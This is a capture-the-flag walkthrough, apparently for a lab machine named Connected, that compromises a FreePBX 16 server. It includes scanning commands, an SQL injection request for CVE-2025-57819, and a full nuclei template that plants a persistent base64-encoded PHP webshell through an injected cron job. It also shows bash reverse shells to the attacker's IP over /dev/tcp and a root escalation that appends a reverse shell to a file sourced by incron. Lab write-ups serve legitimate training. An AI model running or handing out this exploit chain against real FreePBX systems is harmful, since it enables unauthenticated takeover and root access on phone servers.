# Connected

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>



<mark style="color:blue;">**Step 1**</mark>

**Let's start off with a quick nmap scan.**

{% code overflow="wrap" %}
```bash
ip=10.129.7.195

## TCP Scan
nmap -p- --min-rate 10000 -n -Pn -oA nmap/connected_tcp.htb $ip
# 22/tcp  open  ssh
# 80/tcp  open  http
# 443/tcp open  https


# Deeper tcp scan
nmap -sC -sV -A -p53,2222,2121,80,8080,3000,5000,9000,8000 -oA nmap/connected_tcp $ip

# UDP scan
nmap -sU --min-rate 10000 -n -Pn -oA nmap/connected_udp.htb $ip
```
{% endcode %}

<mark style="color:blue;">**Step 2**</mark>

**we modify the hosts file**

{% code overflow="wrap" %}
```bash
echo "10.129.7.195 connected.htb" | tee -a /etc/hosts
```
{% endcode %}

<figure><img src=".gitbook/assets/image (7).png" alt="" width="563"><figcaption></figcaption></figure>

**the port 80 redirect to admin/config.php so now let's discover the site,technology and all stuff**

<mark style="color:blue;">**Step 3**</mark>

{% hint style="info" %}
### Target Summary

* **Application**: FreePBX 16.0.40.7 (open-source PBX/web GUI for Asterisk)
* **Redirect behavior**: Visiting `http://connected.htb` → `http://connected.htb/admin/config.php`
* **OS**: CentOS (likely 7.x)
* **Web server**: Apache 2.4.6
* **Backend**: PHP 7.4.16
* **OpenSSL**: 1.0.2k
* **Frontend**: jQuery 3.1.1, jQuery UI 1.12.1, Moment.js 2.20.1, Notie, Google Analytics/Tag Manager
{% endhint %}

{% hint style="info" %}
### Site Breakdown

* **Login panel** for FreePBX Administration (default path `/admin`).
* After login, you get access to modules: User Control Panel (UCP), Operator Panel, FreePBX Admin dashboard.
* Features present: Extension management, SIP settings, Recording module, Module admin, Backup/Restore.
{% endhint %}

{% hint style="danger" %}
### Attack Surface&#x20;

1. **Default credentials** – try `admin:admin`, `admin:password`, `admin: (blank)`, `root:root`, `fpbx:admin`.
2. **Known CVEs for FreePBX 16**:
   * `CVE-2023-36038` – authenticated RCE via Recordings module (command injection in filename field).
   * `CVE-2022-44031` – SQL injection in `getAjax` (if unauthenticated in some versions, check `/admin/ajax.php?module=...`).
   * `CVE-2021-34426` – path traversal in `language` parameter.
3. **Public exploits**: Search for `FreePBX 16 RCE` – there's a Metasploit module (`exploit/linux/http/freepbx_recordings_rce`) and python scripts.
4. **Unauthenticated endpoints**:
   * `/admin/backup` – might expose backup files.
   * `/admin/config.php.bak` – source leak.
   * `/admin/libraries` – directory listing possible.
   * `/admin/ucp` – User Control Panel may have weak auth.
{% endhint %}

<mark style="color:blue;">**Step 4**</mark>

**After deep searching i found that our version is vulnerable to this exploit&#x20;**<mark style="color:$danger;">**CVE-2025-57819**</mark>

{% hint style="info" %}
**CVE-2025-57819 is a critical vulnerability in FreePBX that allows unauthenticated attackers to execute arbitrary code through SQL injection, leading to complete system compromise. It affects FreePBX versions 15, 16, and 17, and has been actively exploited in the wild.**
{% endhint %}

<mark style="color:blue;">**Step 5**</mark>

**Let's exploit this**&#x20;

{% code overflow="wrap" %}
```bash
nuclei -u http://connected.htb/ -t /root/nuclei-templates/http/cves/2025/CVE-2025-57819.yaml -vv -debug -debug-req -debug-resp

# http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~'))+--+
Output :

#{"error":{"type":"Exception","message":"SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~USER:freepbxuser@localhost~'::","file":"\/var\/www\/html\/admin\/libraries\/utility.functions.php","line":123}}
```
{% endcode %}

**we successfully exploit this and we receive our user freepbxuser. now the SQL injection vulnerability allows you to insert arbitrary records into the `cron_jobs`**

<mark style="color:blue;">**Step 6**</mark>

**Basing on the nuclei template let's customize the template to create a template that inject a webshell into the cron job functionnality**

{% code overflow="wrap" %}
```yaml
id: CVE-2025-57819-rce-dynamic

info:
  name: FreePBX CVE-2025-57819 - Dynamic RCE via Cron Webshell
  author: you
  severity: critical
  description: |
    Injects a cron job via SQLi to drop a persistent PHP webshell, executes a custom command, and optionally cleans up.
  tags: cve2025,freepbx,rce,intrusive

variables:
  jobname: "{{to_lower(rand_text_alpha(6))}}"
  filename: "{{to_lower(rand_text_alpha(5))}}"
  cmd: "id"
  cleanup: "true"
  webshell_b64: "PD9waHAgaWYoaXNzZXQoJF9HRVRbJ2MnXSkpeyBzeXN0ZW0oJF9HRVRbJ2MnXSk7IH0gPz4="

flow: http(1) && http(2) && http(3)

http:
  # Step 1: Inject cron job to drop persistent PHP webshell
  - raw:
      - |
        GET /admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x';INSERT+INTO+cron_jobs+(modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order)+VALUES+('sysadmin','{{jobname}}','echo+%22{{webshell_b64}}%22%7Cbase64+-d+%3E%2Fvar%2Fwww%2Fhtml%2F{{filename}}.php',NULL,'*+*+*+*+*',30,1,1)+--+ HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "status_code == 500"
        internal: true

  # Step 2: Wait for cron (runs every 60s), then execute command via webshell
  - raw:
      - |
        @timeout: 90s
        GET /{{filename}}.php?c={{cmd}}&x={{wait_for(75)}} HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"

    extractors:
      - type: dsl
        name: rce_output
        dsl:
          - body

  # Step 3: Cleanup cron job (only if cleanup=true)
  - raw:
      - |
        GET /admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x';DELETE+FROM+cron_jobs+WHERE+jobname='{{jobname}}'+--+ HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "status_code == 500"
        internal: true

```
{% endcode %}

{% code overflow="wrap" %}
```bash
nuclei -u http://connected.htb -t CVE-2025-57819-rce-dynamic.yaml -var cmd="id" -vv
# "uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)"
```
{% endcode %}

<mark style="color:blue;">**Step 7**</mark>

**Bash reverse shell**

{% code overflow="wrap" %}
```bash
nuclei -u http://connected.htb -t CVE-2025-57819-rce-dynamic.yaml -var cmd="bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.63%2F9001%200%3E%261%22" -vv

listener 9001
listening on [any] 9001 ...

# connect to [10.10.14.63] from (UNKNOWN) [10.129.7.195] 58218
# bash: no job control in this shell
# ______                   ______ ______ __   __
# |  ___|                  | ___ \| ___ \\ \ / /
# | |_    _ __   ___   ___ | |_/ /| |_/ / \ V /
# |  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \
# | |    | |   |  __/|  __/| |    | |_/ // /^\ \
# \_|    |_|    \___| \___|\_|    \____/ \/   \/


# NOTICE! You have 3 notifications! Please log into the UI to see them!
# Current Network Configuration
# +-----------+-------------------+---------------------------+
# | Interface | MAC Address       | IP Addresses              |
# +-----------+-------------------+---------------------------+
# | eth0      | A2:DE:AD:46:DF:82 | 10.129.7.195              |
# |           |                   | fe80::82bd:1bcb:a990:dd3b | +-----------+-------------------+---------------------------+
```
{% endcode %}

<mark style="color:blue;">**Step 8**</mark>

**We focus on the incron rules that watch `/var/spool/asterisk/sysadmin/`**

**i try every privilege escalation vector but i cant found nothing since freepbx is related to incron jobs that its a job that is a file-system event monitor that runs commands when files or directories change**

**we have writable permissions on the directory `/var/spool/asterisk/sysadmin/`**

**so we can trigger anything every script then i found that the dahri serive management is vulnerable**

{% code overflow="wrap" %}
```bash
cat /etc/init.d/dahdi
# The smoking gun is right here:
# line 64 [ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf
```
{% endcode %}

{% hint style="info" %}
The `.` command **sources** `/etc/dahdi/init.conf` into the current shell — which runs as **root** via incron. Any commands in that file execute as root.
{% endhint %}

<mark style="color:blue;">**Step 9**</mark>&#x20;

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">touch /etc/dahdi/init.conf 2>&#x26;1
echo 'bash -i >&#x26; /dev/tcp/10.10.14.63/9002 0>&#x26;1' >> /etc/dahdi/init.conf
echo "trigger" > /var/spool/asterisk/sysadmin/dahdi_restart

istener 9002
# listening on [any] 9002 ...
<strong># connect to [10.10.14.63] from (UNKNOWN) [10.129.7.195] 38060
</strong># bash: no job control in this shell
id
<strong># uid=0(root) gid=0(root) groups=0(root)
</strong></code></pre>

